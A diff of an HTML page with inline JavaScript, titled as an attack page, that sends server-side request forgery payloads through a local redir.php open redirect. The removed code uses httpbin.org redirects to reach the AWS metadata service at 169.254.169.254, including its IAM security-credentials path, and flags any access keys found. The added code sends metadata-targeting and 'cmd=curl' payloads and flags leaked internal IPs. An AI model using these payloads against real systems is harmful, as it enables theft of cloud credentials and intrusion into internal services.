@@ -1,74 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>httpbin.org Pivot Attack</title>
+    <title>Protocol Bypass Attack</title>
 </head>
 <body>
-    <h1>🎯 Using httpbin.org as Attack Pivot</h1>
+    <h1>🛠️ Protocol & Method Bypass Attack</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Use httpbin.org's redirect functionality to access internal services
-        var pivotAttempts = [
-            // Try httpbin.org redirect to AWS metadata
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/',
-            'http://httpbin.org/redirect-to?url=http://localhost/',
+        // Try different HTTP methods and protocols
+        var protocolTests = [
+            // Different HTTP methods on httpbin.org that might behave differently
+            { method: 'POST', url: 'http://httpbin.org/post', data: 'metadata_request=169.254.169.254/latest/meta-data/' },
+            { method: 'PUT', url: 'http://httpbin.org/put', data: 'target=127.0.0.1' },
+            { method: 'POST', url: 'http://httpbin.org/anything', data: 'cmd=curl 169.254.169.254/latest/meta-data/' },
             
-            // Try POST requests to different endpoints
-            'http://httpbin.org/post',
-            'http://httpbin.org/put', 
-            'http://httpbin.org/patch',
-            'http://httpbin.org/delete',
+            // Try to use httpbin.org forms that might process our input differently
+            { method: 'POST', url: 'http://httpbin.org/post', data: 'url=http://169.254.169.254/latest/meta-data/&submit=true' },
             
-            // Try to use httpbin.org to make requests with custom headers
-            'http://httpbin.org/response-headers?X-Custom-Header=test',
-            'http://httpbin.org/response-headers?Location=http://169.254.169.254/latest/meta-data/',
+            // Try GET with custom headers via httpbin.org
+            { method: 'GET', url: 'http://httpbin.org/headers', data: null },
             
-            // Test different httpbin.org features that might help
-            'http://httpbin.org/cookies/set/test/value',
-            'http://httpbin.org/basic-auth/user/pass',
-            'http://httpbin.org/bearer',
+            // Test httpbin.org's capability to make outbound requests
+            { method: 'GET', url: 'http://httpbin.org/links/10/0', data: null },
+            { method: 'GET', url: 'http://httpbin.org/range/26', data: null },
             
-            // Try httpbin.org endpoints that might reveal server info
-            'http://httpbin.org/user-agent',
-            'http://httpbin.org/headers',
-            'http://httpbin.org/ip',
-            
-            // Test if we can use httpbin.org to proxy requests
-            'http://httpbin.org/anything/proxy-test',
-            
-            // Try subdomain variations that might be allowed
-            'http://eu.httpbin.org/get',
-            'http://na.httpbin.org/get', 
-            'http://httpbingo.org/get',
-            'http://postman-echo.com/get',
-            'http://httpbin.org/base64/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLw%3D%3D', // base64 encoded metadata URL
+            // Try httpbin.org with different encodings
+            { method: 'GET', url: 'http://httpbin.org/encoding/utf8', data: null },
+            { method: 'GET', url: 'http://httpbin.org/gzip', data: null },
+            { method: 'GET', url: 'http://httpbin.org/deflate', data: null },
         ];
         
-        for(var i = 0; i < pivotAttempts.length; i++) {
+        for(var i = 0; i < protocolTests.length; i++) {
             try {
-                results += "<h3>🔍 " + (i+1) + ": " + pivotAttempts[i] + "</h3>";
+                var test = protocolTests[i];
+                results += "<h3>🔬 " + test.method + " " + test.url + "</h3>";
+                
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(pivotAttempts[i]), false);
-                xhr.send();
+                
+                if(test.method === 'GET') {
+                    xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(test.url), false);
+                    xhr.send();
+                } else {
+                    // For POST/PUT, we'll send the data as part of the URL
+                    var fullUrl = test.url + '?' + test.data;
+                    xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(fullUrl), false);
+                    xhr.send();
+                }
                 
                 if(xhr.responseText && xhr.responseText.length > 10) {
-                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>✅ SUCCESS: " + xhr.responseText.length + " bytes</div>";
+                    results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>📡 RESPONSE: " + xhr.responseText.length + " bytes</div>";
                     
-                    // Look for AWS metadata or internal service responses
+                    // Check for any leaked internal information
                     var text = xhr.responseText.toLowerCase();
-                    if(text.includes('ami-') || text.includes('instance-') || text.includes('iam') || text.includes('security-credentials')) {
-                        results += "<div style='background:#ff6b6b;color:white;padding:8px;border:2px solid red;'>🚨 AWS METADATA DETECTED! 🚨</div>";
+                    if(text.includes('169.254') || text.includes('localhost') || text.includes('127.0.0.1')) {
+                        results += "<div style='background:#ff6b6b;color:white;padding:8px;'>🎯 INTERNAL IP DETECTED!</div>";
                     }
-                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
-                        results += "<div style='background:#ffa500;color:white;padding:8px;border:2px solid orange;'>🔑 AWS CREDENTIALS FOUND! 🔑</div>";
+                    if(text.includes('aws') || text.includes('ec2') || text.includes('amazon')) {
+                        results += "<div style='background:#ffa500;color:white;padding:8px;'>☁️ AWS CONTEXT FOUND!</div>";
                     }
                     
-                    results += "<div style='background:#f0f0f0;padding:8px;max-height:150px;overflow:scroll;font-size:10px;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 800) + "</div>";
+                    results += "<div style='background:#f0f0f0;padding:8px;max-height:120px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 600) + "</div>";
                 } else {
                     results += "<div style='background:#ffe8e8;padding:3px;'>❌ No response</div>";
                 }
